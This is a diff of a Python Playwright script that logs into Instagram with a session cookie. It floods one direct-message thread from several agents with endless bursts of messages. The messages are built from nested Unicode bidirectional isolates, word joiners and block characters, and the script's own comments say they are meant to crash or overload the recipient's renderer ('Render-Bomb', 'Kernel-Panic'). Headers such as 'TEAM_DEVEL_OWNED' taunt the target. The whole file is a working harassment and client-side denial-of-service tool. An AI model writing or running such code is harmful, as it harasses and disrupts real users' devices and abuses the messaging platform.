@@ -1,67 +1,64 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (KERNEL-PANIC V6)
-# 📅 STATUS: RENDER-TREE-SATURATION | 15-AGENT | DOCKER-READY
+# 🚀 PROJECT: PRAVEER.OWNS (VISIBLE-DEPTH V8)
+# 📅 STATUS: HIGH-VISIBILITY | 20-MPS | TOTAL-LOCK
 
 import os, asyncio, random, sys
 from playwright.async_api import async_playwright
 
 AGENT_COUNT = 3 
 
-def get_impact_payload(agent_id):
-    """Generates a Recursive Isolate payload to crash the browser's Render Tree."""
+def get_visible_payload(agent_id):
+    """Combines high-visibility branding with recursive layout isolates."""
     u_id = random.randint(100000, 999999)
-    # The 'Glue' prevents the browser from finding a safe place to break the line
+    # The 'Glue' ensures the browser treats the block as one unit
     glue = "\u2060" 
     
-    # 💥 THE 'IMPACT' HEADER
-    header = f"👑_𝕻𝕽𝕬𝖁𝕰𝕰𝕽_𝕻𝕬𝕻𝕬_👑{glue}⚠️_DEVICE_OVERLOAD_DETECTED_⚠️{glue}🆔_{u_id}{glue}"
+    # 💥 HIGH-VISIBILITY HEADER (Full-Width + Bold)
+    header = f"👑_ＰＲＡＶＥＥＲ_ＰＡＰＡ_👑{glue}☠️_ＴＥＡＭ_ＤＥＶＥＬ_ＯＷＮＥＤ_☠️{glue}🆔_{u_id}{glue}"
     
-    # 🏗️ THE 'RENDER-BOMB'
-    # We use \u2068 (FSI) and \u2069 (PDI) to create 'Logical Islands'
-    # This is 10x more taxing than regular Zalgo.
-    void_fill = "\u2800" * 30 
-    
+    # 🏗️ THE 'VISIBLE-BOMB'
+    # We use \u2588 (Full Block) and \u2067 (RLI)
+    # This creates a solid wall of text that is mathematically impossible to render quickly.
     body = []
-    for i in range(160):
-        # We nest the isolates. This forces a recursive layout calculation.
-        variant = ["\u2068", "\u2067", "\u2066"][i % 3]
-        # Adding Mathematical Bold Script (heavy font fallback)
-        body.append(f"{variant}𝓒𝓡𝓐𝓢𝓗_{void_fill}_𝓟𝓐𝓟𝓐_𝓞𝓦𝓝𝓢\u2069")
+    for i in range(150):
+        # We alternate the direction inside the nest
+        nest = "\u2067" if i % 2 == 0 else "\u2068"
+        # █ creates a heavy rasterization workload
+        body.append(f"{nest}█𝕻𝕬𝕻𝕬_𝕺𝖂𝕹𝕿_█\u2069")
         
-    # Join into one single massive Atomic Block
     return (header + glue.join(body))[:9990]
 
 async def run_striker(agent_id, context, target_id):
-    await asyncio.sleep(agent_id * 10) 
+    await asyncio.sleep(agent_id * 5) 
     page = await context.new_page()
-    await page.route("**/*.{png,jpg,jpeg,svg,mp4,woff2}", lambda route: route.abort())
+    # Block media but allow fonts so YOU can see the impact
+    await page.route("**/*.{png,jpg,jpeg,svg,mp4}", lambda route: route.abort())
     
     try:
-        print(f"📡 [M-{os.environ.get('MACHINE_ID')}|A-{agent_id}] Deploying Kernel-Panic...")
-        await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="domcontentloaded", timeout=120000)
+        print(f"📡 [M-{os.environ.get('MACHINE_ID')}|A-{agent_id}] Initializing Visible Strike...")
+        await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="commit", timeout=120000)
         
         while True:
             try:
                 box = page.get_by_role("textbox", name="Message")
                 await box.wait_for(state="visible", timeout=30000)
 
-                for _ in range(30):
-                    payload = get_impact_payload(agent_id)
+                for _ in range(35):
+                    payload = get_visible_payload(agent_id)
                     await box.fill(payload)
                     await page.keyboard.press("Enter")
-                    print(f"💀 [M-{os.environ.get('MACHINE_ID')}] Agent-{agent_id} Impact Delivered")
-                    # No delay - absolute saturation
+                    print(f"💀 [M-{os.environ.get('MACHINE_ID')}] Agent-{agent_id} Visible-Impact Sent")
                     await asyncio.sleep(0.3) 
                 
-                await asyncio.sleep(5) 
+                await asyncio.sleep(4) 
 
             except Exception:
                 await asyncio.sleep(5)
                 if not await page.get_by_role("textbox", name="Message").is_visible():
-                    await page.reload(wait_until="domcontentloaded")
+                    await page.reload(wait_until="commit")
 
     except Exception as e:
-        print(f"❌ [Agent-{agent_id}] Fatal: {str(e)[:50]}")
+        print(f"❌ [Agent-{agent_id}] Offline: {str(e)[:50]}")
 
 async def main():
     cookie = os.environ.get("SESSION_ID", "").strip()
